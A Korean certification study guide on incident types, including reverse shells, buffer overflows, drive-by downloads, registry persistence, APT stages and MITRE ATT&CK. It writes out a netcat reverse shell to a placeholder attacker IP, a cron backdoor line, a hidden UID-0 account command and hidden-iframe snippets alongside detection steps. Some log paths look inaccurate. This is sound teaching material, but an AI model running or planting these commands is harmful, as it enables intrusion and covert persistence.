@@ -1,0 +1,337 @@
+> 섹션 15는 Reverse Shell → Buffer Overflow/Exploit → DBD → 윈도우 레지스트리 → Watering Hole → APT/MITRE ATT&CK까지 침해사고 유형 전반을 다루며, 특히 APT 공격 단계와 MITRE ATT&CK 프레임워크 서술형이 최근 시험에서 급증하고 있습니다. 침해사고 시나리오 분석 + 대응 방법을 단계별로 서술하는 형태로 자주 출제됩니다.
+
+## 1. 개념 및 배경
+
+침해사고 유형별 시나리오는 공격자가 시스템에 침투하여 지속성을 확보하고 목적을 달성하는 일련의 흐름을 학습하는 섹션입니다. 단순 이론이 아닌 실제 로그·명령어·코드 분석을 통해 공격 유형을 식별하고 대응하는 능력을 요구하며, 서술형 고배점 문제로 주로 출제됩니다.
+
+## 2. 동작 원리 / 구조
+
+### 🐚 1. Reverse Shell
+
+**개념**
+
+공격자가 피해 서버에서 외부(공격자 서버)로 연결을 역으로 맺는 기법. 방화벽은 일반적으로 외부→내부 접속을 차단하지만 내부→외부 연결은 허용하기 때문에 우회 가능.
+
+```bash
+# [공격자 서버] 포트 80 대기
+nc -lvp 80
+# [피해 서버] 공격자에게 역방향 쉘 연결
+nc [공격자IP] [Port] -e /bin/bash
+
+# [cron 등록으로 재부팅 후에도 지속성 유지]
+echo "30 2 * * * root /usr/bin/nc [IP] [Port] -e /bin/bash" >> /etc/crontab
+```
+
+**탐지 방법**
+
+```bash
+ps -ef | grep nc | grep -v grep       # nc 프로세스 확인
+netstat -antp | grep [공격자IP]         # 외부 비정상 연결 확인
+/var/log/cron 확인                     # cron 등록 여부
+cat /etc/crontab                      # 악성 cron 확인
+```
+
+### 🔍 보완: Reverse Shell vs Bind Shell
+
+| 구분 | Reverse Shell (역방향) | Bind Shell (순방향) |
+|------|----------------------|--------------------|
+| 연결 방향 | 피해자 → 공격자 (Outbound) | 공격자 → 피해자 (Inbound) |
+| 리스닝 위치 | 공격자가 대기 | 피해자가 특정 포트로 대기 |
+| 방화벽 우회 | 내부→외부 허용 정책 악용 → 우회 용이 | 인바운드 차단 시 연결 실패 |
+| 피해자 명령 | `nc [공격자IP] [Port] -e /bin/bash` | `nc -lvp [Port] -e /bin/bash` |
+| 공격자 명령 | `nc -lvp [Port]` | `nc [피해자IP] [Port]` |
+
+> 🔍 **보완**: 실무에서 Reverse Shell이 더 위협적인 이유는 대부분의 방화벽이 내부→외부(Outbound) 연결을 허용하기 때문입니다. Bind Shell은 피해자가 포트를 열고 대기하므로 인바운드를 차단하면 무력화됩니다.
+
+### 💣 2. Buffer Overflow & Exploit / Shell Code
+
+**Buffer Overflow 메모리 구조**
+
+| 메모리 영역 | 설명 |
+|------------|------|
+| Stack | 지역변수, 함수 인자, RET(Return Address) 저장 |
+| Heap | 동적 할당 메모리 (malloc 등) |
+| Data | 전역변수, 초기화 변수 |
+| Text(Code) | 실행 코드 |
+
+**공격 핵심 원리**
+
+```text
+입력값 → 버퍼 오버플로우 → RET(Return Address) 덮어쓰기
+→ RET를 ESP(스택 포인터) 또는 Shell Code 주소로 변조
+→ Shell Code 실행 (setreuid(0,0) + system("/bin/bash"))
+→ root 권한 획득
+```
+
+**Shell Code 특징**
+
+- NOP Sled (`0x90`): RET가 정확히 Shell Code를 가리키지 않아도 실행되도록 NOP 명령어를 Shell Code 앞에 나열
+- Shell Code 내 `setreuid(0,0)` + `setregid(0,0)` 호출 → root/root 권한으로 `/bin/bash` 실행
+
+**대응**
+
+- ASLR (Address Space Layout Randomization): 메모리 주소를 랜덤화하여 RET 덮어쓰기 무력화
+
+### 🌐 3. DBD (Drive By Download) ⭐⭐⭐
+
+**개념**
+
+- 사용자가 악성 웹 페이지를 단순 방문하는 것만으로도 악성 코드가 자동 다운로드·설치되는 공격
+- 브라우저 취약점, 플러그인(Flash, PDF, ActiveX 등) 취약점 이용
+
+**DBD 공격 흐름**
+
+```text
+1단계: 공격자 → 정상 사이트(A)에 악성 코드 삽입
+       (A 사이트에 iframe 태그 삽입 → B 악성 사이트로 유도)
+2단계: 피해자가 A 사이트 방문
+3단계: A 사이트 내 iframe이 B 악성 사이트 자동 연결
+       (iframe width=0, height=0, src=B → 피해자 눈에 보이지 않음)
+4단계: B 사이트 → C 사이트로 리다이렉트
+       (취약점 코드 실행 → 악성파일 자동 다운로드)
+5단계: 피해자 PC에 악성코드 설치 (OS 장악)
+6단계: A 사이트가 C&C(Command & Control) 서버와 연결
+```
+
+**DBD 탐지 방법**
+
+| 탐지 도구 | 사용법 |
+|-----------|--------|
+| `URI → stat` | URI 접근 이력 및 파일 상태 확인 |
+| HTTP Referer 확인 | 어떤 사이트에서 유도됐는지 확인 |
+| IECacheView | IE 브라우저 캐시 분석 (8080 포트) |
+| TCPView | Windows TCP 연결 현황 확인 |
+| Process Explorer | 실행 프로세스 트리 분석 |
+
+**DBD 코드 특징 (분석 포인트)**
+
+```html
+// 난독화 기법 특징
+unescape() 함수 16진수 인코딩 사용
+// iframe 은닉
+<iframe width=0 height=0 src="http://악성사이트">
+// 이미지 태그를 이용한 은닉
+<img src="http://악성사이트/exploit.php">
+```
+
+### 🖥️ 4. 윈도우 레지스트리 — 백도어 지속성
+
+**Windows 레지스트리 5대 루트 키 (암기 필수!)**
+
+| 약칭 | 전체 키 이름 | 역할 |
+|------|-------------|------|
+| HKCR | HKEY_CLASSES_ROOT | 파일 연결, COM 오브젝트 |
+| HKCU | HKEY_CURRENT_USER | 현재 로그인 사용자 설정 |
+| HKLM | HKEY_LOCAL_MACHINE | 시스템 전체 설정, 하드웨어 정보 |
+| HKU | HKEY_USERS | 모든 사용자 프로파일 |
+| HKCC | HKEY_CURRENT_CONFIG | 현재 하드웨어 프로파일 |
+
+**공격자의 레지스트리 악용 (백도어 자동 실행)**
+
+```text
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+→ 이 키에 악성 실행파일 경로 등록 → 부팅 시 자동 실행
+→ 지속성(Persistence) 확보
+```
+
+**침해사고 시 Windows 조사 명령어**
+
+```text
+hostname, whoami, ver, systeminfo   → 시스템 정보 확인
+ipconfig /all                       → 네트워크 설정
+netstat -anob                       → 연결 현황 + 프로세스
+net use, net share, net session     → 공유 자원 확인
+tasklist /v                         → 실행 프로세스 목록
+ipconfig /displaydns                → DNS 캐시 확인
+arp -a                              → ARP 테이블
+netstat -rn / route print           → 라우팅 테이블
+```
+
+### 🎣 5. Watering Hole (워터링 홀)
+
+**개념**
+
+- 공격 대상이 자주 방문하는 웹사이트를 미리 감염시켜 놓고, 목표물이 방문하면 자동으로 악성코드를 감염시키는 기법
+- 마치 사자가 물웅덩이(water hole) 앞에서 먹잇감을 기다리는 것처럼 공격 대상을 기다림
+- APT 공격의 초기 침투 수단으로 자주 사용
+
+**Watering Hole vs Spear Phishing 비교**
+
+| 구분 | Watering Hole | Spear Phishing |
+|------|---------------|----------------|
+| 방식 | 자주 방문 웹사이트 감염 | 표적에게 악성 이메일 발송 |
+| 수동성 | 피해자가 스스로 방문 | 피해자가 이메일 클릭 |
+| 특징 | 탐지 어려움 | 사회공학 기법 결합 |
+
+### 🎯 6. APT (Advanced Persistent Threat) ⭐⭐⭐
+
+**APT 정의**
+
+- 특정 표적을 대상으로 장기간 지속적으로 고도화된 공격을 수행하는 위협
+- 국가 지원 해킹 그룹, 사이버 스파이 활동에 주로 적용
+
+**APT 공격 7단계 (Kill Chain)**
+
+```text
+1단계: 정찰 (Reconnaissance)
+      → 목표 시스템·조직·인물 정보 수집 (OSINT 활용)
+
+2단계: 무기화 (Weaponization)
+      → 취약점 이용 악성코드 제작 (Exploit + Payload)
+
+3단계: 전달 (Delivery)
+      → 이메일, 웹사이트, USB, Watering Hole 등으로 전달
+
+4단계: 익스플로잇 (Exploitation)
+      → 취약점 실행, 시스템 침투
+
+5단계: 설치 (Installation)
+      → 백도어·루트킷 설치, 지속성 확보
+
+6단계: C&C 통신 (Command & Control, C2)
+      → 공격자 서버와 통신, 원격 제어
+
+7단계: 목적 실행 (Actions on Objectives)
+      → 데이터 유출, 시스템 파괴, 랜섬웨어 배포 등
+```
+
+**C&C 통신 은닉 기법**
+
+| 기법 | 설명 |
+|------|------|
+| Fast Flux | C&C IP를 DNS로 빠르게 변경하여 탐지 회피 |
+| DGA (Domain Generation Algorithm) | 알고리즘으로 무작위 도메인 생성하여 C&C 연결 |
+| Domain Shadowing | 합법적 도메인의 서브도메인을 탈취하여 C&C로 활용 |
+
+### 🗺️ 7. MITRE ATT&CK 프레임워크 ⭐⭐⭐
+
+**개념**
+
+- 실제 공격 사례에서 관찰된 공격자의 전술(Tactics), 기법(Techniques), 절차(Procedures: TTP)를 체계화한 지식 베이스
+- 미국 MITRE Corporation에서 개발, 무료 공개
+- APT 그룹의 행동 패턴을 분류·분석하는 데 활용
+
+**MITRE ATT&CK 14가지 전술(Tactics)**
+
+| 전술 | 설명 |
+|------|------|
+| Reconnaissance | 정찰 |
+| Resource Development | 자원 개발 |
+| Initial Access | 초기 침투 (Spear Phishing, Watering Hole 등) |
+| Execution | 코드 실행 |
+| Persistence | 지속성 확보 (레지스트리, 백도어) |
+| Privilege Escalation | 권한 상승 |
+| Defense Evasion | 방어 우회 (루트킷, 난독화) |
+| Credential Access | 자격증명 탈취 |
+| Discovery | 정보 수집 |
+| Lateral Movement | 내부 이동 |
+| Collection | 데이터 수집 |
+| Command and Control | C&C 통신 |
+| Exfiltration | 데이터 유출 |
+| Impact | 영향 (파괴, 랜섬웨어) |
+
+> 📌 시험 핵심: "MITRE ATT&CK = 실제 공격 관찰 기반 TTP 프레임워크" + APT 7단계와 MITRE ATT&CK 전술을 매핑할 수 있어야 함
+
+> 🔍 **보완**: 전술(Tactic)은 공격자가 달성하려는 "목적(왜)"이고, 기법(Technique)은 그 목적을 이루는 "방법(어떻게)"입니다. 예: 전술 `Persistence(지속성)` ← 기법 `Registry Run Keys`, `Scheduled Task(cron)`. 하나의 전술 아래 여러 기법이 존재하며, 각 기법은 T1547 같은 고유 ID로 식별됩니다. 서술형에서는 Tactic(목적) → Technique(방법) → Procedure(실제 구현) 계층을 예시와 함께 쓰면 고득점입니다.
+
+> 🔍 **보완**: 사이버 킬체인(Lockheed Martin, 7단계 = 정찰→무기화→전달→익스플로잇→설치→C&C→목적실행)은 "공격의 선형 진행 단계"를 나타내고, MITRE ATT&CK은 "실제 관찰된 공격 행위(TTP)의 매트릭스"입니다. 킬체인은 단계별 차단 지점을 설계하는 데, ATT&CK은 공격 행위를 세부 분류·탐지하는 데 활용됩니다.
+
+### 🔐 8. 악성코드 난독화 및 인코딩 기법
+
+**주요 난독화 기법**
+
+| 기법 | 설명 |
+|------|------|
+| XOR 인코딩 | 바이트를 XOR 연산으로 숨김 |
+| BASE64 인코딩 | 바이너리를 문자열로 변환하여 탐지 우회 |
+| 10진수/16진수 변환 | ASCII 코드를 숫자로 표현 |
+
+**악성코드 분석 유형**
+
+| 분석 유형 | 설명 | 도구 |
+|-----------|------|------|
+| 정적 분석 | 실행 없이 코드·구조 분석 | PEiD, IDA Pro, Ghidra, YARA |
+| 동적 분석 | 실제 실행하여 행위 관찰 | Cuckoo Sandbox, Any.Run, OllyDbg, x64dbg |
+| PE 파일 분석 | Windows 실행파일 구조 분석 | IDA Pro, Ghidra, Radare2 |
+
+## 3. 예시 / 적용 시나리오
+
+### 🎯 기출 최빈출: APT 공격 단계 서술형
+
+**기출 유형**
+
+```text
+Q. APT 공격의 특징 3가지와 공격 단계를 설명하시오.
+
+특징 3가지:
+1. 지능성(Advanced): 고도화된 기술과 제로데이 취약점 사용
+2. 지속성(Persistent): 장기간(수개월~수년) 탐지되지 않도록 잠복
+3. 위협(Threat): 특정 표적을 대상으로 한 의도적 공격
+
+공격 7단계:
+1. 정찰 → 2. 무기화 → 3. 전달 → 4. 익스플로잇
+→ 5. 설치 → 6. C&C 통신 → 7. 목적 실행
+```
+
+### 🎯 기출: DBD 분석 시나리오
+
+**기출 유형**
+
+```text
+Q. 아래 코드에서 DBD 공격의 특징을 설명하시오.
+(PHP 난독화 코드, unescape() 16진수, iframe width=0 height=0)
+
+답:
+1. PHP 파일에 난독화된 악성 스크립트 삽입
+   → unescape() 함수로 16진수 인코딩된 코드 복호화
+2. iframe(width=0, height=0)으로 악성 사이트 은닉 연결
+   → 피해자 눈에 보이지 않음
+3. 정상 사이트 방문만으로 자동 악성코드 다운로드
+4. 브라우저·플러그인 취약점 이용
+
+탐지 방법:
+- HTTP Referer 분석으로 유도 경로 확인
+- IECacheView로 캐시 분석
+- Process Explorer로 비정상 프로세스 확인
+```
+
+### 🎯 기출: Linux 침해사고 완전 분석 시나리오
+
+**실제 기출 흐름**
+
+```text
+[Linux 서버 Telnet 침해사고 시나리오]
+1. Telnet으로 root 직접 접속 (Telnet 허용된 취약 설정)
+2. useradd -o -u 0 -g 0 root attack →
+   UID/GID 0으로 attack 계정 생성 (root 권한 숨겨진 계정)
+3. cron 백도어 등록:
+   30 2 * * * root /usr/bin/nc [IP] [Port] -e /bin/bash
+
+[분석 절차]
+1. /var/secure, /var/messages로 root Telnet 접속 로그 확인
+2. ~/.bash_history, crontab 확인 → /etc/crontab의 nc 등록 확인
+3. /etc/passwd 확인 → UID/GID가 0인 비정상 계정 탐지
+   (attack:x:0:0::/home/attack:/bin/bash → UID=0이면 root 권한)
+4. netstat -antp | grep [IP] → 외부 nc 연결 확인
+5. ps -ef | grep [PID] | grep -v grep → 프로세스 확인
+```
+
+## 4. 실무 및 시험 포인트 정리
+
+| 주제 | 핵심 암기 | 출제 빈도 |
+|------|----------|----------|
+| Reverse Shell | `nc -lvp 80` + `nc IP Port -e /bin/bash` + cron 등록 | ⭐⭐⭐ |
+| Buffer Overflow | Stack → RET 덮어쓰기 → NOP Sled(0x90) → ShellCode → ESP | ⭐⭐⭐ |
+| ASLR | 메모리 주소 랜덤화 → RET 공격 무력화 | ⭐⭐ |
+| DBD 흐름 | 정상사이트 iframe → 악성사이트 자동 연결 → 악성코드 설치 | ⭐⭐⭐ |
+| DBD 탐지 | HTTP Referer, IECacheView, TCPView, Process Explorer | ⭐⭐ |
+| 윈도우 레지스트리 5대 키 | HKCR/HKCU/HKLM/HKU/HKCC — HKLM이 시스템 전체 | ⭐⭐⭐ |
+| Watering Hole | 자주 방문 사이트 사전 감염 → APT 초기 침투 | ⭐⭐⭐ |
+| APT 7단계 | 정찰→무기화→전달→익스플로잇→설치→C&C→목적실행 | ⭐⭐⭐ |
+| APT 특징 3가지 | 지능성·지속성·위협 (Advanced·Persistent·Threat) | ⭐⭐⭐ |
+| C&C 은닉 기법 | Fast Flux(IP 변경), DGA(랜덤 도메인), Domain Shadowing | ⭐⭐ |
+| MITRE ATT&CK | 실제 공격 관찰 기반 TTP 프레임워크, 14가지 전술 | ⭐⭐⭐ |
+| 악성코드 분석 | 정적(PEiD/IDA Pro/Ghidra), 동적(Cuckoo/OllyDbg) | ⭐⭐ |
+| Linux 침해사고 | UID=0 숨겨진 계정, cron 백도어, /var/secure 로그 분석 | ⭐⭐⭐ |
+
+> 📌 서술형 고득점 전략: APT 문제는 반드시 "Advanced(지능성) + Persistent(지속성) + Threat(위협)" 특징 3가지를 먼저 쓰고, 7단계 Kill Chain을 순서대로 서술해야 합니다. MITRE ATT&CK 문제는 "실제 관찰된 공격자의 TTPs를 체계화한 프레임워크"라는 정의와 함께 전술(Tactics) → 기법(Techniques) → 절차(Procedures) 계층 구조를 명시하면 고득점입니다.
